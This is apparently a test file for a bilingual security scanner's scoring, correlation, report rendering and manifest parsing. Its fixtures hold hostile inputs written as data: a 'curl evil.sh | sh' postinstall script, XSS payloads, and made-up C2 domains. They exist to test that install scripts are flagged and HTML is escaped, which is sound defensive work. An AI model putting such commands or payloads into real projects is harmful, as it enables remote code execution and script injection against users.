import { describe, expect, it } from 'vitest';
import {
  buildReport,
  correlate,
  dedupeFindings,
  maxSeverity,
  mergeIocs,
  scoreFindings,
  severityFromScore,
  severityRank,
  type CorrelationRule,
} from '../../src/security/risk.js';
import { SEVERITY_META, CATEGORY_LABEL, type Finding, type Severity } from '../../src/security/types.js';
import { renderReport, renderMarkdown, alertBanner, hardeningAdvice, severitySummaryLine } from '../../src/security/report.js';
import { parseManifest, structuralFindings, cvssBaseScore } from '../../src/security/dependency.js';
import { ToolError } from '../../src/utils/errors.js';

const finding = (over: Partial<Finding> = {}): Finding => ({
  id: over.id ?? 'test.finding',
  category: over.category ?? 'permission',
  severity: over.severity ?? 'medium',
  confidence: over.confidence ?? 80,
  title: over.title ?? { fa: 'عنوان', en: 'Title' },
  evidence: over.evidence ?? ['evidence'],
  explanation: over.explanation ?? { fa: 'توضیح', en: 'Explanation' },
  ...(over.recommendation ? { recommendation: over.recommendation } : {}),
});

describe('Severity vocabulary', () => {
  it('orders severities correctly', () => {
    const order: Severity[] = ['safe', 'low', 'medium', 'high', 'critical'];
    for (let i = 1; i < order.length; i++) {
      expect(severityRank(order[i] as Severity)).toBeGreaterThan(severityRank(order[i - 1] as Severity));
    }
  });

  it('gives every severity an icon and both languages', () => {
    for (const [name, meta] of Object.entries(SEVERITY_META)) {
      expect(meta.icon, name).toBeTruthy();
      expect(meta.fa, name).toBeTruthy();
      expect(meta.en, name).toBeTruthy();
    }
  });

  it('labels every finding category in both languages', () => {
    for (const [name, label] of Object.entries(CATEGORY_LABEL)) {
      expect(label.fa, name).toBeTruthy();
      expect(label.en, name).toBeTruthy();
    }
  });

  it('maps scores onto the documented bands', () => {
    expect(severityFromScore(0)).toBe('safe');
    expect(severityFromScore(10)).toBe('low');
    expect(severityFromScore(30)).toBe('medium');
    expect(severityFromScore(60)).toBe('high');
    expect(severityFromScore(80)).toBe('critical');
  });
});

describe('Scoring', () => {
  it('weights a finding by its confidence', () => {
    const confident = scoreFindings([finding({ severity: 'high', confidence: 100 })]).score;
    const unsure = scoreFindings([finding({ severity: 'high', confidence: 30 })]).score;
    expect(confident).toBeGreaterThan(unsure);
  });

  it('applies diminishing returns to repeats within a category', () => {
    const one = scoreFindings([finding({ id: 'a', severity: 'medium' })]).score;
    const five = scoreFindings([
      finding({ id: 'a', severity: 'medium' }),
      finding({ id: 'b', severity: 'medium' }),
      finding({ id: 'c', severity: 'medium' }),
      finding({ id: 'd', severity: 'medium' }),
      finding({ id: 'e', severity: 'medium' }),
    ]).score;
    expect(five).toBeGreaterThan(one);
    expect(five).toBeLessThan(one * 5);
  });

  it('ranks one critical above several mediums', () => {
    const critical = scoreFindings([finding({ severity: 'critical', confidence: 90 })]).score;
    const mediums = scoreFindings(
      ['a', 'b', 'c', 'd'].map((id) => finding({ id, severity: 'medium', confidence: 90 })),
    ).score;
    expect(critical).toBeGreaterThan(mediums);
  });

  it('produces an explainable breakdown', () => {
    const { steps, score } = scoreFindings([
      finding({ id: 'x', severity: 'high', title: { fa: 'الف', en: 'Alpha' } }),
      finding({ id: 'y', severity: 'low', title: { fa: 'ب', en: 'Beta' } }),
    ]);
    expect(steps).toHaveLength(2);
    expect(steps[0]?.label.en).toBe('Alpha');
    const sum = steps.reduce((total, step) => total + step.points, 0);
    expect(Math.round(sum)).toBe(score);
  });

  it('keeps the score within 0..100', () => {
    const many = Array.from({ length: 40 }, (_, index) =>
      finding({ id: `f${index}`, severity: 'critical', confidence: 100 }),
    );
    const { score } = scoreFindings(many);
    expect(score).toBeGreaterThanOrEqual(0);
    expect(score).toBeLessThanOrEqual(100);
  });

  it('ignores safe findings', () => {
    expect(scoreFindings([finding({ severity: 'safe', confidence: 100 })]).score).toBe(0);
  });
});

describe('Deduplication and merging', () => {
  it('keeps the worst instance and merges evidence', () => {
    const merged = dedupeFindings([
      finding({ id: 'dup', severity: 'low', evidence: ['first'] }),
      finding({ id: 'dup', severity: 'high', evidence: ['second'] }),
    ]);
    expect(merged).toHaveLength(1);
    expect(merged[0]?.severity).toBe('high');
  });

  it('merges IOC sources and keeps the worst severity', () => {
    const merged = mergeIocs([
      { kind: 'domain', value: 'evil.tk', sources: ['dex'], severity: 'low', confidence: 60 },
      { kind: 'domain', value: 'EVIL.tk', sources: ['manifest'], severity: 'high', confidence: 80 },
    ]);
    expect(merged).toHaveLength(1);
    expect(merged[0]?.severity).toBe('high');
    expect(merged[0]?.sources).toEqual(expect.arrayContaining(['dex', 'manifest']));
    expect(merged[0]?.confidence).toBe(80);
  });

  it('reports the worst severity present', () => {
    expect(maxSeverity([finding({ severity: 'low' }), finding({ severity: 'high' })])).toBe('high');
    expect(maxSeverity([])).toBe('safe');
  });
});

describe('Correlation', () => {
  const rule: CorrelationRule = {
    id: 'test.corr',
    requires: ['a.one', 'a.two'],
    severity: 'critical',
    confidence: 90,
    title: { fa: 'ت', en: 'Correlated' },
    explanation: { fa: 'ت', en: 'Explanation' },
  };

  it('fires only when every requirement is present', () => {
    expect(correlate([finding({ id: 'a.one' })], [rule])).toHaveLength(0);
    expect(correlate([finding({ id: 'a.one' }), finding({ id: 'a.two' })], [rule])).toHaveLength(1);
  });

  it('supports prefix patterns', () => {
    const prefixRule: CorrelationRule = { ...rule, id: 'p', requires: ['a.*', 'b.*'] };
    const result = correlate([finding({ id: 'a.x' }), finding({ id: 'b.y' })], [prefixRule]);
    expect(result).toHaveLength(1);
  });

  it('honours minMatches', () => {
    const partial: CorrelationRule = { ...rule, id: 'm', requires: ['a.one', 'a.two', 'a.three'], minMatches: 2 };
    expect(correlate([finding({ id: 'a.one' }), finding({ id: 'a.three' })], [partial])).toHaveLength(1);
  });

  it('requires the anchor even when minMatches is satisfied', () => {
    const anchored: CorrelationRule = {
      ...rule,
      id: 'anchored',
      requires: ['anchor.id', 'other.one', 'other.two'],
      anchor: 'anchor.id',
      minMatches: 2,
    };
    // Two non-anchor matches must not be enough.
    expect(correlate([finding({ id: 'other.one' }), finding({ id: 'other.two' })], [anchored])).toHaveLength(0);
    expect(correlate([finding({ id: 'anchor.id' }), finding({ id: 'other.one' })], [anchored])).toHaveLength(1);
  });

  it('records which findings triggered the rule', () => {
    const [correlated] = correlate([finding({ id: 'a.one' }), finding({ id: 'a.two' })], [rule]);
    expect(correlated?.evidence).toEqual(['a.one', 'a.two']);
    expect(correlated?.category).toBe('correlation');
  });
});

describe('Report building', () => {
  const base = {
    scanType: 'apk' as const,
    target: 'com.example.app',
    targetHash: 'a'.repeat(64),
  };

  it('caps the score below CRITICAL when nothing correlates', () => {
    const many = Array.from({ length: 12 }, (_, index) =>
      finding({ id: `perm${index}`, category: 'permission', severity: 'high', confidence: 100 }),
    );
    const report = buildReport({ ...base, findings: many });
    expect(report.severity).not.toBe('critical');
    expect(report.score).toBeLessThanOrEqual(74);
    expect(report.scoreBreakdown.some((step) => step.detail?.includes('CRITICAL'))).toBe(true);
  });

  it('allows CRITICAL when a correlation produced it', () => {
    const rules: CorrelationRule[] = [
      {
        id: 'corr.bad',
        requires: ['x.one', 'x.two'],
        severity: 'critical',
        confidence: 95,
        title: { fa: 'ت', en: 'Bad' },
        explanation: { fa: 'ت', en: 'Bad' },
      },
    ];
    const report = buildReport({
      ...base,
      findings: [finding({ id: 'x.one', severity: 'high' }), finding({ id: 'x.two', severity: 'high' })],
      correlationRules: rules,
    });
    expect(report.severity).toBe('critical');
  });

  it('never reports a verdict worse than the worst finding', () => {
    const lows = Array.from({ length: 20 }, (_, index) =>
      finding({ id: `l${index}`, severity: 'low', confidence: 100 }),
    );
    const report = buildReport({ ...base, findings: lows });
    expect(report.severity).toBe('low');
  });

  it('raises the verdict to a confirmed high-confidence finding', () => {
    const report = buildReport({
      ...base,
      scanType: 'file',
      findings: [finding({ id: 'privacy.gps', category: 'privacy', severity: 'high', confidence: 100 })],
    });
    expect(report.severity).toBe('high');
  });

  it('reports safe when there are no findings', () => {
    const report = buildReport({ ...base, findings: [] });
    expect(report.severity).toBe('safe');
    expect(report.score).toBe(0);
  });
});

describe('Report rendering', () => {
  const report = buildReport({
    scanType: 'apk',
    target: 'com.example.app',
    targetHash: 'b'.repeat(64),
    findings: [
      finding({ id: 'apk.perm.camera', severity: 'high', confidence: 90, recommendation: { fa: 'ت', en: 'Revoke it' } }),
      finding({ id: 'apk.config.backup', severity: 'low', confidence: 70 }),
    ],
    iocs: [{ kind: 'domain', value: 'c2.example.tk', sources: ['dex'], severity: 'medium', confidence: 70 }],
    facts: [{ label: { fa: 'بسته', en: 'Package' }, value: 'com.example.app' }],
  });

  it('renders a Persian report with all sections', () => {
    const html = renderReport(report, { lang: 'fa' });
    expect(html).toContain('com.example.app');
    expect(html).toContain('🔴');
    expect(html).toContain('c2.example.tk');
    expect(html.length).toBeGreaterThan(200);
  });

  it('renders an English report', () => {
    const html = renderReport(report, { lang: 'en' });
    expect(html).toContain('Findings');
    expect(html).toContain('Revoke it');
  });

  it('escapes HTML in evidence so a crafted filename cannot inject markup', () => {
    const nasty = buildReport({
      scanType: 'file',
      target: '<img src=x onerror=alert(1)>',
      targetHash: 'c'.repeat(64),
      findings: [finding({ evidence: ['<script>alert(1)</script>'] })],
    });
    const html = renderReport(nasty, { lang: 'en' });
    // The payload must survive only as inert text: angle brackets escaped, so
    // no tag is ever created. The literal substring "onerror=" may still
    // appear — harmlessly — inside &lt;img …&gt;, which is the point.
    expect(html).not.toContain('<script>');
    expect(html).not.toContain('<img');
    expect(html).toContain('&lt;img');
    expect(html).toContain('&lt;script&gt;');
  });

  it('shows an alert banner only for high and critical verdicts', () => {
    expect(alertBanner('critical', 'en')).toContain('CRITICAL');
    expect(alertBanner('high', 'en')).toContain('HIGH');
    expect(alertBanner('medium', 'en')).toBe('');
    expect(alertBanner('safe', 'fa')).toBe('');
  });

  it('summarises finding counts by severity', () => {
    const line = severitySummaryLine([finding({ severity: 'high' }), finding({ severity: 'low' })]);
    expect(line).toContain('🔴');
    expect(line).toContain('🟡');
  });

  it('produces hardening advice tailored to the findings', () => {
    const advice = hardeningAdvice(report, 'en');
    expect(advice.length).toBeGreaterThan(0);
    expect(advice.join(' ')).toMatch(/permission|firewall|store/i);
  });

  it('renders valid Markdown', () => {
    const markdown = renderMarkdown(report, 'en');
    expect(markdown).toContain('# Security Report');
    expect(markdown).toContain('| Field | Value |');
    expect(markdown).toContain('## Findings');
  });
});

describe('Dependency manifests', () => {
  it('parses package.json dependencies', () => {
    const parse = parseManifest(
      JSON.stringify({ dependencies: { lodash: '^4.17.21' }, devDependencies: { vitest: '2.0.0' } }),
      'package.json',
    );
    expect(parse.ecosystem).toBe('npm');
    expect(parse.dependencies).toHaveLength(2);
    expect(parse.dependencies.find((dep) => dep.name === 'lodash')?.resolved).toBe('4.17.21');
    expect(parse.dependencies.find((dep) => dep.name === 'vitest')?.dev).toBe(true);
  });

  it('parses requirements.txt with version specifiers', () => {
    const parse = parseManifest('django==4.2.1\nrequests>=2.28.0\n# comment\nflask[async]==2.3.0\n', 'requirements.txt');
    expect(parse.ecosystem).toBe('PyPI');
    expect(parse.dependencies.map((dep) => dep.name)).toEqual(['django', 'requests', 'flask']);
    expect(parse.dependencies[0]?.resolved).toBe('4.2.1');
  });

  it('parses go.mod require blocks', () => {
    const parse = parseManifest('module example.com/m\n\ngo 1.21\n\nrequire (\n\tgithub.com/pkg/errors v0.9.1\n)\n', 'go.mod');
    expect(parse.ecosystem).toBe('Go');
    expect(parse.dependencies[0]?.name).toBe('github.com/pkg/errors');
    expect(parse.dependencies[0]?.resolved).toBe('v0.9.1');
  });

  it('parses Cargo.toml dependencies', () => {
    const parse = parseManifest('[package]\nname = "x"\n\n[dependencies]\nserde = "1.0.100"\ntokio = { version = "1.2" }\n', 'Cargo.toml');
    expect(parse.ecosystem).toBe('crates.io');
    expect(parse.dependencies.map((dep) => dep.name)).toEqual(['serde', 'tokio']);
  });

  it('parses composer.json and skips platform requirements', () => {
    const parse = parseManifest(JSON.stringify({ require: { php: '>=8.1', 'monolog/monolog': '^3.0' } }), 'composer.json');
    expect(parse.dependencies.map((dep) => dep.name)).toEqual(['monolog/monolog']);
  });

  it('rejects an unrecognised format', () => {
    expect(() => parseManifest('just some text', 'notes.md')).toThrow(ToolError);
  });

  it('rejects malformed JSON', () => {
    expect(() => parseManifest('{ not json', 'package.json')).toThrow(ToolError);
  });

  it('flags install scripts, wildcards and remote sources', () => {
    const parse = parseManifest(
      JSON.stringify({
        dependencies: { a: '*', b: 'git+https://example.com/b.git' },
        scripts: { postinstall: 'curl evil.sh | sh' },
      }),
      'package.json',
    );
    const found = structuralFindings(parse).map((item) => item.id);
    expect(found).toContain('dep.install_scripts');
    expect(found).toContain('dep.wildcard_range');
    expect(found).toContain('dep.remote_source');
  });

  it('computes CVSS v3.1 base scores from vectors', () => {
    // Published reference vectors and their official base scores.
    expect(cvssBaseScore('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H')).toBeCloseTo(9.8, 1);
    expect(cvssBaseScore('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H')).toBeCloseTo(7.5, 1);
    expect(cvssBaseScore('CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:L/I:N/A:N')).toBeCloseTo(1.8, 1);
    // Scope-changed vector documented by FIRST (base score 6.1).
    expect(cvssBaseScore('CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N')).toBeCloseTo(6.1, 1);
    // Cisco's published example for a low-confidentiality network vector.
    expect(cvssBaseScore('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N')).toBeCloseTo(5.3, 1);
    expect(cvssBaseScore('not a vector')).toBeNull();
  });
});
